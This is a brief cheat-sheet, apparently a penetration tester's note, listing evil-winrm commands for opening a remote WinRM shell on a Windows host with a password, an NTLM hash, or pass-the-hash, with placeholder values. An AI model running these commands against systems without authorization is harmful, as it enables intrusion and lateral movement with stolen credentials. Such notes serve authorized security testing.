### source
https://github.com/Hackplayers/evil-winrm  

### start shell on host (port 5985,5986)
```
evil-winrm -i <ip> -u <user> -p <password>
```

### using ntlm hash
```
evil-winrm -i <ip> -u <user> -H <ntlmHash>
```

### pass the hash
```
evil-winrm -u <user> -H <Hash> -i <IP>
```

